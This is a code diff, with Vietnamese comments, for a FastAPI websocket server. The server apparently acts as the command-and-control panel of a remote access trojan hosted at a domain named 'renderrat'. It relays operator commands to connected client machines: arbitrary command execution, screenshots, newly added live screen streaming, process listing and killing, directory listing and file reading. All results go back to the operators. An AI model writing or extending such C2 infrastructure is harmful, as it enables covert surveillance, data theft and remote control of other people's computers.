@@ -9,33 +9,32 @@ import os
 app = FastAPI()
 
 # ===============================
-# CONFIG TEMPLATE + STATIC
+# TEMPLATES + STATIC
 # ===============================
 
 templates = Jinja2Templates(directory="templates")
 
-# Chỉ mount static nếu thư mục tồn tại
 if os.path.exists("static"):
     app.mount("/static", StaticFiles(directory="static"), name="static")
 
 # ===============================
-# STORAGE CONNECTIONS
+# CONNECTIONS
 # ===============================
 
 clients: Dict[str, WebSocket] = {}
 admins: Set[WebSocket] = set()
 
+# Track which admin is watching which client (for stream routing)
+admin_watching: Dict[WebSocket, str] = {}   # admin_ws → client_id
+
 # ===============================
-# WEB ADMIN PAGE
+# PAGES
 # ===============================
 
 @app.get("/", response_class=HTMLResponse)
 async def admin_page(request: Request):
-    return templates.TemplateResponse("admin.html", {
-        "request": request
-    })
+    return templates.TemplateResponse("admin.html", {"request": request})
 
-# Health check endpoint cho Render
 @app.get("/health")
 async def health_check():
     return {
@@ -52,59 +51,68 @@ async def health_check():
 async def client_ws(websocket: WebSocket, client_id: str):
     await websocket.accept()
     clients[client_id] = websocket
-    
-    print(f"[CLIENT CONNECTED] {client_id}")
+    print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
     await notify_admins_clients()
 
     try:
         while True:
             data = await websocket.receive_text()
             message = json.loads(data)
+            msg_type = message.get("type")
 
-            # Client gửi screenshot
-            if message.get("type") == "screenshot":
+            # ── Stream frame — forward nhanh nhất có thể ──────────
+            if msg_type == "stream_frame":
+                await broadcast_stream_frame(client_id, {
+                    "type": "stream_frame",
+                    "client_id": client_id,
+                    "image": message.get("image"),
+                    "ts": message.get("ts")
+                })
+
+            # ── Screenshot ────────────────────────────────────────
+            elif msg_type == "screenshot":
                 await broadcast_to_admins({
                     "type": "screenshot",
                     "client_id": client_id,
                     "image": message.get("image")
                 })
-                print(f"[SCREENSHOT] Received from {client_id}")
-            
-            # Client gửi kết quả command
-            elif message.get("type") == "command_result":
+
+            # ── Command result ────────────────────────────────────
+            elif msg_type == "command_result":
                 await broadcast_to_admins({
                     "type": "command_result",
                     "client_id": client_id,
                     "output": message.get("output")
                 })
-                print(f"[COMMAND RESULT] Received from {client_id}")
-            
-            # Client gửi system info
-            elif message.get("type") == "client_connected":
+
+            # ── Client connected (sysinfo) ─────────────────────────
+            elif msg_type == "client_connected":
                 await broadcast_to_admins({
                     "type": "client_info",
                     "client_id": client_id,
                     "sysinfo": message.get("sysinfo")
                 })
-                print(f"[SYSINFO] Received from {client_id}")
-            
-            # Client gửi các loại data khác
+
+            # ── Other data (sysinfo, processes, files…) ───────────
             else:
                 await broadcast_to_admins({
-                    "type": message.get("type"),
+                    "type": msg_type,
                     "client_id": client_id,
-                    "data": message.get("data")
+                    "data": message.get("data"),
+                    "result": message.get("result"),
+                    "path": message.get("path")
                 })
 
     except WebSocketDisconnect:
-        if client_id in clients:
-            del clients[client_id]
-        print(f"[CLIENT DISCONNECTED] {client_id}")
-        await notify_admins_clients()
+        pass
     except Exception as e:
-        print(f"[CLIENT ERROR] {client_id}: {e}")
+        print(f"[CLIENT ERR] {client_id}: {e}")
+    finally:
         if client_id in clients:
             del clients[client_id]
+        # Dừng stream cho các admin đang xem client này
+        await stop_stream_for_client(client_id)
+        print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
         await notify_admins_clients()
 
 # ===============================
@@ -115,137 +123,156 @@ async def client_ws(websocket: WebSocket, client_id: str):
 async def admin_ws(websocket: WebSocket):
     await websocket.accept()
     admins.add(websocket)
-    
-    print(f"[ADMIN CONNECTED] Total admins: {len(admins)}")
+    print(f"[ADMIN +] Total: {len(admins)}")
     await notify_admins_clients()
 
     try:
         while True:
             data = await websocket.receive_text()
             message = json.loads(data)
+            msg_type = message.get("type")
+            client_id = message.get("client_id")
 
-            # Admin yêu cầu screenshot
-            if message.get("type") == "request_screenshot":
-                client_id = message.get("client_id")
+            # ── Stream control ────────────────────────────────────
+            if msg_type == "start_stream":
+                if client_id and client_id in clients:
+                    admin_watching[websocket] = client_id
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "start_stream"
+                    }))
+                    print(f"[STREAM] Admin started stream → {client_id}")
 
+            elif msg_type == "stop_stream":
+                if client_id and client_id in clients:
+                    if websocket in admin_watching:
+                        del admin_watching[websocket]
+                    # Dừng stream nếu không còn admin nào xem
+                    watchers = [a for a, c in admin_watching.items() if c == client_id]
+                    if not watchers:
+                        await clients[client_id].send_text(json.dumps({
+                            "type": "stop_stream"
+                        }))
+                    print(f"[STREAM] Admin stopped stream → {client_id}")
+
+            # ── Screenshot ────────────────────────────────────────
+            elif msg_type == "request_screenshot":
                 if client_id in clients:
                     await clients[client_id].send_text(json.dumps({
                         "type": "request_screenshot",
                         "quality": message.get("quality", 85)
                     }))
-                    print(f"[REQUEST] Screenshot from {client_id}")
 
-            # Admin gửi lệnh
-            elif message.get("type") == "command":
-                client_id = message.get("client_id")
-                command = message.get("command")
-
+            # ── Command ───────────────────────────────────────────
+            elif msg_type == "command":
                 if client_id in clients:
                     await clients[client_id].send_text(json.dumps({
                         "type": "command",
-                        "command": command
+                        "command": message.get("command")
                     }))
-                    print(f"[COMMAND] Sent to {client_id}: {command}")
-            
-            # Admin yêu cầu system info
-            elif message.get("type") == "request_sysinfo":
-                client_id = message.get("client_id")
-                
+
+            # ── Sysinfo ───────────────────────────────────────────
+            elif msg_type == "request_sysinfo":
                 if client_id in clients:
-                    await clients[client_id].send_text(json.dumps({
-                        "type": "request_sysinfo"
-                    }))
-                    print(f"[REQUEST] System info from {client_id}")
-            
-            # Admin yêu cầu process list
-            elif message.get("type") == "request_processes":
-                client_id = message.get("client_id")
-                
+                    await clients[client_id].send_text(json.dumps({"type": "request_sysinfo"}))
+
+            # ── Processes ─────────────────────────────────────────
+            elif msg_type == "request_processes":
                 if client_id in clients:
-                    await clients[client_id].send_text(json.dumps({
-                        "type": "request_processes"
-                    }))
-                    print(f"[REQUEST] Process list from {client_id}")
-            
-            # Admin kill process
-            elif message.get("type") == "kill_process":
-                client_id = message.get("client_id")
-                pid = message.get("pid")
-                
+                    await clients[client_id].send_text(json.dumps({"type": "request_processes"}))
+
+            elif msg_type == "kill_process":
                 if client_id in clients:
                     await clients[client_id].send_text(json.dumps({
                         "type": "kill_process",
-                        "pid": pid
+                        "pid": message.get("pid")
                     }))
-                    print(f"[REQUEST] Kill process {pid} on {client_id}")
-            
-            # Admin list directory
-            elif message.get("type") == "list_directory":
-                client_id = message.get("client_id")
-                path = message.get("path", ".")
-                
+
+            # ── Files ─────────────────────────────────────────────
+            elif msg_type == "list_directory":
                 if client_id in clients:
                     await clients[client_id].send_text(json.dumps({
                         "type": "list_directory",
-                        "path": path
+                        "path": message.get("path", ".")
                     }))
-                    print(f"[REQUEST] List directory {path} on {client_id}")
-            
-            # Admin read file
-            elif message.get("type") == "read_file":
-                client_id = message.get("client_id")
-                path = message.get("path")
-                
+
+            elif msg_type == "read_file":
                 if client_id in clients:
                     await clients[client_id].send_text(json.dumps({
                         "type": "read_file",
-                        "path": path
+                        "path": message.get("path")
                     }))
-                    print(f"[REQUEST] Read file {path} on {client_id}")
 
     except WebSocketDisconnect:
-        admins.remove(websocket)
-        print(f"[ADMIN DISCONNECTED] Total admins: {len(admins)}")
+        pass
     except Exception as e:
-        print(f"[ADMIN ERROR] {e}")
-        if websocket in admins:
-            admins.remove(websocket)
+        print(f"[ADMIN ERR] {e}")
+    finally:
+        admins.discard(websocket)
+        # Dừng stream nếu admin đang xem
+        if websocket in admin_watching:
+            client_id = admin_watching.pop(websocket)
+            watchers = [a for a, c in admin_watching.items() if c == client_id]
+            if not watchers and client_id in clients:
+                await clients[client_id].send_text(json.dumps({"type": "stop_stream"}))
+        print(f"[ADMIN -] Total: {len(admins)}")
 
 # ===============================
-# HELPER FUNCTIONS
+# HELPERS
 # ===============================
 
 async def notify_admins_clients():
-    """Thông báo danh sách client cho tất cả admin"""
     await broadcast_to_admins({
         "type": "clients",
         "clients": list(clients.keys())
     })
 
 async def broadcast_to_admins(message: dict):
-    """Gửi message đến tất cả admin"""
-    dead_admins = set()
-
+    dead = set()
     for admin in admins:
         try:
             await admin.send_text(json.dumps(message))
-        except Exception as e:
-            print(f"[BROADCAST ERROR] {e}")
-            dead_admins.add(admin)
+        except Exception:
+            dead.add(admin)
+    for d in dead:
+        admins.discard(d)
 
-    for dead in dead_admins:
-        admins.remove(dead)
+async def broadcast_stream_frame(client_id: str, message: dict):
+    """Chỉ gửi stream frame cho admin đang xem client này"""
+    dead = set()
+    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
+    payload = json.dumps(message)
+    for admin in watchers:
+        try:
+            await admin.send_text(payload)
+        except Exception:
+            dead.add(admin)
+    for d in dead:
+        admins.discard(d)
+        admin_watching.pop(d, None)
+
+async def stop_stream_for_client(client_id: str):
+    """Notify admins đang xem client vừa disconnect"""
+    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
+    for admin in watching_admins:
+        admin_watching.pop(admin, None)
+        try:
+            await admin.send_text(json.dumps({
+                "type": "stream_stopped",
+                "client_id": client_id,
+                "reason": "client_disconnected"
+            }))
+        except Exception:
+            pass
 
 # ===============================
-# STARTUP EVENT
+# STARTUP
 # ===============================
 
 @app.on_event("startup")
 async def startup_event():
     print("=" * 50)
-    print("🚀 Server Started!")
+    print("  Server Started!")
     print("=" * 50)
-    print("Admin Panel: https://renderrat.onrender.com")
-    print("WebSocket Client: wss://renderrat.onrender.com/ws/client/{client_id}")
-    print("WebSocket Admin: wss://renderrat.onrender.com/ws/admin")
+    print("  Admin : https://renderrat.onrender.com")
+    print("  Client: wss://renderrat.onrender.com/ws/client/{id}")
     print("=" * 50)
